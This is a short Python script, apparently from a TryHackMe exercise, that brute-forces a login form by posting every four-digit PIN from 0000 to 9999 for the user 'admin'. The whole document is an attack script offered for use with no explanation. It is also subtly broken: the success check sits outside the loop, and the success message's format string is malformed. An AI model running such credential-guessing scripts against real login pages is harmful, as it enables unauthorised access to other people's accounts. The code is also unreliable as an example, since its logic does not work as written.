# Import Modules
import requests

# URL
url = "https://www.tryhackme.com/login"

# Credentials
username = "admin"

# 4-digit number passwords (0000-9999)
password_list = [str(i).zfill(4) for i in range(10000)]

def brute_force():
    for password in password_list:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
    
    if "Invalid" not in response.text:
        print("f[+] Valid Creds found: {username}:{password}")
    else:
        print(f"[-] Attempted: {password}")

brute_force()